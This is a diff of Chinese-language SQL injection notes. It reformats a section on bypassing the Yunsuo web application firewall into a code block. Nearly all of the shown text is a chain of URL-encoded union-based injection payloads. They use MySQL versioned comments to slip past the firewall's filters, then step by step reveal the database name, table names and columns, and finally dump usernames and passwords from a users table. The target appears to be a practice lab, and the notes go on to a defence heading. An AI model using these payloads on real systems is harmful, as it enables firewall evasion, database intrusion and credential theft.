@@ -142,17 +142,14 @@
 
 ### 绕过云锁
 
-> ?id=-1%20union/*!99999aaaa*/select%201,2,3
->
-> ?id=-1%20union/*!99999aaaa*/select%201,database/*!99999aaaa*/(),3	database被过滤
->
-> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables),3	select... from被过滤
->
-> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()),3	爆表名
->
-> ?id=111%20union/*!99999aaaa*/select%20--1,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27),3	爆字段
->
-> ?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(concat(username,%27~%27,password))from%20security.users),3	查数据
+```
+?id=-1%20union/*!99999aaaa*/select%201,2,3
+?id=-1%20union/*!99999aaaa*/select%201,database/*!99999aaaa*/(),3	database被过滤
+?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables),3	select... from被过滤
+?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=database()),3	爆表名
+?id=111%20union/*!99999aaaa*/select%20--1,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27users%27),3	爆字段
+?id=-1%20union/*!99999aaaa*/select%20--1,(select%20group_concat(concat(username,%27~%27,password))from%20security.users),3	查数据
+```
 
 ## SQL注入防御
 
